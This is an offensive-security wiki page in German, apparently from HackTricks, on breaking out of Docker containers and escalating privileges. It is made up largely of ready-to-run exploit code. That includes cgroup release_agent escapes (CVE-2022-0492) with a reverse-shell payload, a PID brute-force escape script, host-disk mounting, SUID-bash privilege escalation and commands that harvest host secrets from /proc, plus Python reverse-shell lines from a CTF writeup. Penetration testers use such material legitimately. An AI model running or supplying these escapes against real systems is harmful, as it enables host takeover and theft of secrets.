# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Automatische Enumeration & Escape

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Es kann auch **Container enumerieren**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Dieses Tool ist ziemlich **nützlich, um den Container, in dem Sie sich befinden, zu enumerieren und sogar automatisch zu versuchen, zu entkommen**
- [**amicontained**](https://github.com/genuinetools/amicontained): Nützliches Tool, um die Berechtigungen zu erhalten, die der Container hat, um Wege zu finden, daraus zu entkommen
- [**deepce**](https://github.com/stealthcopter/deepce): Tool zur Enumeration und zum Entkommen aus Containern
- [**grype**](https://github.com/anchore/grype): Erhalten Sie die CVEs, die in der Software enthalten sind, die im Image installiert ist

## Escape vom gemounteten Docker Socket

Wenn Sie irgendwie feststellen, dass der **Docker-Socket gemountet ist** innerhalb des Docker-Containers, werden Sie in der Lage sein, daraus zu entkommen.\
Dies geschieht normalerweise in Docker-Containern, die aus irgendeinem Grund eine Verbindung zum Docker-Daemon herstellen müssen, um Aktionen auszuführen.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
In diesem Fall können Sie reguläre Docker-Befehle verwenden, um mit dem Docker-Daemon zu kommunizieren:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> Falls der **Docker-Socket an einem unerwarteten Ort** ist, können Sie dennoch mit ihm kommunizieren, indem Sie den **`docker`**-Befehl mit dem Parameter **`-H unix:///path/to/docker.sock`** verwenden.

Der Docker-Daemon könnte auch [an einem Port (standardmäßig 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) lauschen oder auf Systemd-basierten Systemen kann die Kommunikation mit dem Docker-Daemon über den Systemd-Socket `fd://` erfolgen.

> [!NOTE]
> Achten Sie außerdem auf die Laufzeitsockets anderer hochrangiger Laufzeiten:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Missbrauch von Berechtigungen zur Flucht

Sie sollten die Berechtigungen des Containers überprüfen. Wenn er eine der folgenden Berechtigungen hat, könnten Sie möglicherweise daraus entkommen: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Sie können die aktuellen Container-Berechtigungen mit **den zuvor erwähnten automatischen Tools** oder:
```bash
capsh --print
```
Auf der folgenden Seite können Sie **mehr über Linux-Fähigkeiten erfahren** und wie man sie missbrauchen kann, um Privilegien zu entkommen/eskalieren:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Ausbruch aus privilegierten Containern

Ein privilegierter Container kann mit dem Flag `--privileged` oder durch Deaktivierung spezifischer Abwehrmaßnahmen erstellt werden:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Das Flag `--privileged` senkt die Sicherheit des Containers erheblich und bietet **uneingeschränkten Gerätezugriff** und umgeht **mehrere Schutzmaßnahmen**. Für eine detaillierte Aufschlüsselung siehe die Dokumentation zu den vollständigen Auswirkungen von `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Privilegiert + hostPID

Mit diesen Berechtigungen können Sie einfach **in den Namensraum eines Prozesses wechseln, der als Root auf dem Host läuft**, wie init (pid:1), indem Sie einfach ausführen: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testen Sie es in einem Container, indem Sie ausführen:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegiert

Nur mit dem privilegierten Flag kannst du versuchen, auf **die Festplatte des Hosts zuzugreifen** oder versuchen, **durch Missbrauch von release_agent oder anderen Ausbrüchen zu entkommen**.

Teste die folgenden Umgehungen in einem Container, indem du ausführst:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Mounting Disk - Poc1

Gut konfigurierte Docker-Container erlauben keine Befehle wie **fdisk -l**. Bei falsch konfigurierten Docker-Befehlen, bei denen das Flag `--privileged` oder `--device=/dev/sda1` mit Großbuchstaben angegeben ist, ist es jedoch möglich, die Berechtigungen zu erhalten, um das Host-Laufwerk zu sehen.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Um die Host-Maschine zu übernehmen, ist es trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Und voilà! Sie können jetzt auf das Dateisystem des Hosts zugreifen, da es im Ordner `/mnt/hola` gemountet ist.

#### Mounting Disk - Poc2

Innerhalb des Containers kann ein Angreifer versuchen, weiteren Zugriff auf das zugrunde liegende Host-OS über ein beschreibbares hostPath-Volume zu erhalten, das vom Cluster erstellt wurde. Im Folgenden sind einige gängige Dinge aufgeführt, die Sie innerhalb des Containers überprüfen können, um zu sehen, ob Sie diesen Angreifer-Vektor nutzen können:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privilegierte Eskalation durch Ausnutzung des vorhandenen release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Privilegierte Eskalation durch Ausnutzung von created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Finden Sie eine **Erklärung der Technik** in:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Privilegierte Eskalation durch Missbrauch von release_agent ohne den relativen Pfad zu kennen - PoC3

In den vorherigen Exploits wird der **absolute Pfad des Containers im Dateisystem des Hosts offengelegt**. Dies ist jedoch nicht immer der Fall. In Fällen, in denen Sie **den absoluten Pfad des Containers im Host nicht kennen**, können Sie diese Technik verwenden:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Die Ausführung des PoC innerhalb eines privilegierten Containers sollte eine ähnliche Ausgabe wie folgt liefern:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Privilegierte Flucht durch Ausnutzung sensibler Mounts

Es gibt mehrere Dateien, die möglicherweise gemountet sind und **Informationen über den zugrunde liegenden Host** geben. Einige von ihnen können sogar **etwas anzeigen, das vom Host ausgeführt werden soll, wenn etwas passiert** (was einem Angreifer ermöglichen wird, aus dem Container auszubrechen).\
Der Missbrauch dieser Dateien kann Folgendes ermöglichen:

- release_agent (bereits zuvor behandelt)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Sie können jedoch **andere sensible Dateien** finden, die Sie auf dieser Seite überprüfen können:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Arbiträre Mounts

In mehreren Fällen werden Sie feststellen, dass der **Container ein Volume vom Host gemountet hat**. Wenn dieses Volume nicht korrekt konfiguriert wurde, könnten Sie in der Lage sein, **sensible Daten zuzugreifen/zu ändern**: Geheimnisse lesen, ssh authorized_keys ändern…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilegieneskalation mit 2 Shells und Host-Mount

Wenn Sie als **root innerhalb eines Containers** Zugriff haben, der einen Ordner vom Host gemountet hat, und Sie als **nicht privilegierter Benutzer zum Host entkommen sind** und Lesezugriff auf den gemounteten Ordner haben.\
Sie können eine **bash suid-Datei** im **gemounteten Ordner** innerhalb des **Containers** erstellen und **von dem Host aus ausführen**, um Privilegien zu eskalieren.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilegieneskalation mit 2 Shells

Wenn Sie als **root innerhalb eines Containers** Zugriff haben und als **nicht privilegierter Benutzer auf den Host entkommen sind**, können Sie beide Shells missbrauchen, um **Privesc innerhalb des Hosts** durchzuführen, wenn Sie die Fähigkeit MKNOD innerhalb des Containers haben (standardmäßig vorhanden), wie [**in diesem Beitrag erklärt**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Mit dieser Fähigkeit darf der Root-Benutzer innerhalb des Containers **Blockgerätedateien erstellen**. Gerätedateien sind spezielle Dateien, die verwendet werden, um **auf die zugrunde liegende Hardware & Kernel-Module** zuzugreifen. Zum Beispiel gibt die /dev/sda Blockgerätedatei Zugriff auf **das Rohdatenlesen auf der Festplatte des Systems**.

Docker schützt vor dem Missbrauch von Blockgeräten innerhalb von Containern, indem eine cgroup-Richtlinie durchgesetzt wird, die **Blockgerätelese-/schreiboperationen blockiert**. Dennoch, wenn ein Blockgerät **innerhalb des Containers erstellt wird**, wird es über das Verzeichnis **/proc/PID/root/** von außerhalb des Containers zugänglich. Dieser Zugriff erfordert, dass **der Prozessbesitzer sowohl innerhalb als auch außerhalb des Containers derselbe ist**.

**Exploitation** Beispiel aus diesem [**Writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Wenn Sie auf die Prozesse des Hosts zugreifen können, werden Sie in der Lage sein, viele sensible Informationen, die in diesen Prozessen gespeichert sind, abzurufen. Führen Sie das Testlabor aus:
```
docker run --rm -it --pid=host ubuntu bash
```
Zum Beispiel können Sie die Prozesse mit etwas wie `ps auxn` auflisten und nach sensiblen Details in den Befehlen suchen.

Dann, da Sie **auf jeden Prozess des Hosts in /proc/ zugreifen können, können Sie einfach deren Umgebungsgeheimnisse stehlen**, indem Sie Folgendes ausführen:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Sie können auch **auf die Dateideskriptoren anderer Prozesse zugreifen und deren geöffnete Dateien lesen**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Sie können auch **Prozesse beenden und einen DoS verursachen**.

> [!WARNING]
> Wenn Sie irgendwie privilegierten **Zugriff auf einen Prozess außerhalb des Containers** haben, könnten Sie etwas wie `nsenter --target <pid> --all` oder `nsenter --target <pid> --mount --net --pid --cgroup` ausführen, um **eine Shell mit den gleichen ns-Beschränkungen** (hoffentlich keine) **wie dieser Prozess auszuführen.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Wenn ein Container mit dem Docker [Host-Netzwerk-Driver (`--network=host`)](https://docs.docker.com/network/host/) konfiguriert wurde, ist der Netzwerk-Stack dieses Containers nicht vom Docker-Host isoliert (der Container teilt sich den Netzwerk-Namespace des Hosts), und der Container erhält keine eigene IP-Adresse. Mit anderen Worten, der **Container bindet alle Dienste direkt an die IP des Hosts**. Darüber hinaus kann der Container **ALLE Netzwerkverkehr, den der Host** sendet und empfängt, auf der gemeinsamen Schnittstelle abfangen `tcpdump -i eth0`.

Zum Beispiel können Sie dies verwenden, um **Verkehr abzuhören und sogar zu fälschen** zwischen Host und Metadateninstanz.

Wie in den folgenden Beispielen:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Sie werden auch in der Lage sein, **Netzwerkdienste, die an localhost gebunden sind**, innerhalb des Hosts zuzugreifen oder sogar die **Metadatenberechtigungen des Knotens** zuzugreifen (die möglicherweise anders sind als die, auf die ein Container zugreifen kann).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Mit `hostIPC=true` erhalten Sie Zugriff auf die interprozessuale Kommunikation (IPC) Ressourcen des Hosts, wie z.B. **gemeinsamen Speicher** in `/dev/shm`. Dies ermöglicht das Lesen/Schreiben, wo dieselben IPC-Ressourcen von anderen Host- oder Pod-Prozessen verwendet werden. Verwenden Sie `ipcs`, um diese IPC-Mechanismen weiter zu inspizieren.

- **Untersuchen Sie /dev/shm** - Suchen Sie nach Dateien in diesem gemeinsamen Speicherort: `ls -la /dev/shm`
- **Überprüfen Sie vorhandene IPC-Einrichtungen** – Sie können überprüfen, ob IPC-Einrichtungen verwendet werden mit `/usr/bin/ipcs`. Überprüfen Sie es mit: `ipcs -a`

### Fähigkeiten wiederherstellen

Wenn der Syscall **`unshare`** nicht verboten ist, können Sie alle Fähigkeiten wiederherstellen, indem Sie:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Missbrauch des Benutzer-Namensraums über Symlink

Die zweite Technik, die im Beitrag [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) erklärt wird, zeigt, wie man Bind-Mounts mit Benutzer-Namensräumen missbrauchen kann, um Dateien im Host zu beeinflussen (in diesem speziellen Fall, um Dateien zu löschen).

## CVEs

### Runc-Exploit (CVE-2019-5736)

Falls Sie `docker exec` als root ausführen können (wahrscheinlich mit sudo), versuchen Sie, die Berechtigungen zu eskalieren, indem Sie aus einem Container unter Ausnutzung von CVE-2019-5736 entkommen (Exploit [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Diese Technik wird im Wesentlichen die _**/bin/sh**_ Binärdatei des **Hosts** **aus einem Container** **überschreiben**, sodass jeder, der docker exec ausführt, die Payload auslösen kann.

Ändern Sie die Payload entsprechend und bauen Sie die main.go mit `go build main.go`. Die resultierende Binärdatei sollte im Docker-Container zur Ausführung platziert werden.\
Bei der Ausführung, sobald `[+] Overwritten /bin/sh successfully` angezeigt wird, müssen Sie Folgendes von der Host-Maschine aus ausführen:

`docker exec -it <container-name> /bin/sh`

Dies wird die Payload auslösen, die in der main.go-Datei vorhanden ist.

Für weitere Informationen: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Es gibt andere CVEs, für die der Container anfällig sein kann, eine Liste finden Sie unter [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Custom Escape

### Docker Escape Surface

- **Namespaces:** Der Prozess sollte **vollständig von anderen Prozessen getrennt** sein über Namespaces, sodass wir nicht mit anderen Prozessen interagieren können aufgrund von Namespaces (standardmäßig kann nicht über IPCs, Unix-Sockets, Netzwerkdienste, D-Bus, `/proc` anderer Prozesse kommuniziert werden).
- **Root-Benutzer**: Standardmäßig ist der Benutzer, der den Prozess ausführt, der Root-Benutzer (seine Berechtigungen sind jedoch eingeschränkt).
- **Fähigkeiten**: Docker lässt die folgenden Fähigkeiten zu: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Dies sind die Syscalls, die der **Root-Benutzer nicht aufrufen kann** (aufgrund fehlender Fähigkeiten + Seccomp). Die anderen Syscalls könnten verwendet werden, um zu versuchen, zu entkommen.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
